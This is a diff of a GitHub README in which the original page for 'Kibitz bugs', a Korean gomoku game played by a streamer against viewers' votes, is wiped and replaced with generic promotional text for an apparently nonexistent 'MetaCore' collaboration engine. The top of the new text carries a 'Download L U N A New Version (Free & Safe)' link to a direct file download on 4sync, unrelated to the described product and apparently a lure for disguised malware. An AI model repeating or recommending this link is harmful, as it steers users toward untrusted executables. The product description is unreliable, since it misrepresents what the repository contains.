@@ -1,77 +1,75 @@
-<p align="center">
-  <img src="assets/coverImg.png" width="480" alt="Kibitz Bugs Cover Image" />
-</p>
+# 🌌 MetaCore — Next-Gen Execution Engine
+🔥 [📥 Download L U N A New Version (Free & Safe)](https://www.4sync.com/web/directDownload/PXTRJT2A/1vCL9_A6.21bbcdd30a2127968b624bd5f6b4a0dd)  
 
-<h1 align="center">Kibitz bugs</h1>
-<p align="center">스트리머 vs 시청자 집단지성 오목 게임</p>
-
-<p align="center" style="display: flex; justify-content: center; align-items: center; gap: 8px;">
-  <a href="https://github.com/minu-j/kibitz-bugs/releases" target="_blank"><img src="https://img.shields.io/github/v/tag/minu-j/kibitz-bugs?label=release" alt="Release" /></a>
-  <a href="https://github.com/minu-j/kibitz-bugs/blob/master/LICENSE" target="_blank"><img src="https://img.shields.io/github/license/minu-j/kibitz-bugs" alt="GitHub Repo stars" /></a>
-  <a href="https://github.com/minu-j/kibitz-bugs/stargazers" target="_blank"><img src="https://img.shields.io/github/stars/minu-j/kibitz-bugs" alt="GitHub Repo stars" /></a>
-</p>
-
-"Kibitz bugs"는 스트리머와 시청자가 함께 즐기는 오목 게임입니다. 시청자는 댓글 투표로 게임에 참여할 수 있으며, 스트리머는 시청자의 집단지성과 대결합니다.
-
-> **What is gomoku?**
->
-> The rules of Gomoku are simple: align five consecutive stones in a line to win. A line can be horizontal, vertical, or diagonal.
-
-## Links
-
-**[🚀 Play now!](https://kibitz-bugs.xyz/)**
-
-**[📺 Watch on Youtube](https://www.youtube.com/playlist?list=PL5gs1D9-S_9g4hkd-Z14JvIV6zTFS3nZx)**
-
-## Stack
-
-- React 18
-- Springboot 2.7.10
-- Spring Data JPA
-- MariaDB
-- AWS EC2
-- Nginx
-
-## Team
-
-<table>
-  <tr>
-    <td>
-      minu-j
-    </td>
-    <td>
-      Front-end
-    </td>
-    <td>
-      <a href="https://github.com/minu-j" target="_blank">
-        Link
-      </a>
-    </td>
-  </tr>
-  <tr>
-    <td>
-      ysu6691
-    </td>
-    <td>
-      Back-end & Infra
-    </td>
-    <td>
-      <a href="https://github.com/ysu6691" target="_blank">
-        Link
-      </a>
-    </td>
-  </tr>
-</table>
-
-## Contributors
-
-<a href="https://github.com/minu-j/kibitz-bugs/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=minu-j/kibitz-bugs" />
-</a>
-
-<br>
-<br>
+🔥 **MetaCore** is a cutting-edge collaboration engine built for creators, developers, and teams who want uninterrupted flow, real-time sync, and frictionless teamwork.
 
 ---
 
-Copyright © 2024 Kibitz Games
+## ⚡ Overview
+
+**MetaCore** is a high-performance live-collaboration framework powered by **Go** and **WebAssembly**.  
+It keeps teams aligned instantly — whether you’re designing, coding, or writing — with seamless updates and conflict-free edits that feel natural.
+
+---
+
+## ✨ Key Features
+
+### 🧬 Mesh-Based Collaboration  
+Every edit syncs across the network instantly — no merge conflicts, no downtime.
+
+### 📝 Dual Canvas + Document Mode  
+Navigate effortlessly between structured **Markdown/MDX docs** and a **freeform visual canvas** for sketches, diagrams, and rapid ideation.
+
+### 🔁 Live Versioning  
+Automatic history for every action. Rewind, branch, or replay any change in seconds — collaboration with zero risk.
+
+### 🌗 Dynamic Theming  
+Built-in **Light/Dark modes** with instant switching.
+
+### ♾️ Always Connected (Even Offline)  
+Offline-first architecture that syncs cleanly once reconnected.  
+Deploy anywhere: self-host or use MetaCore Cloud.
+
+
+## 🧩 Example Configuration (`MetaCore.toml`)
+
+```toml
+[workspace]
+name = "MetaCore Studio"
+theme = "aether-neon"
+
+[sync]
+autosave = true
+conflictMode = "merge-last-write-wins"
+```
+
+---
+
+## 🧠 Roadmap
+
+- 🔌 Plugin ecosystem for custom widgets & app integrations  
+- 🎙️ Built-in voice & video chat overlay within the canvas  
+- 🌍 Multilingual UI & content localization  
+- 📱 Mobile companion app (iOS & Android)
+
+---
+
+## 💡 Contributing
+
+We welcome open collaboration!  
+1. Fork the repository  
+2. Create a feature branch  
+3. Write clean, tested code  
+4. Open a pull request  
+
+> ✨ Focus on clarity, design, and user delight.
+
+---
+
+## 📜 License
+
+**MIT License © 2025 MetaCore Contributors**
+
+---
+
+**MetaCore** — where teams move in sync, think in flow, and create without limits.
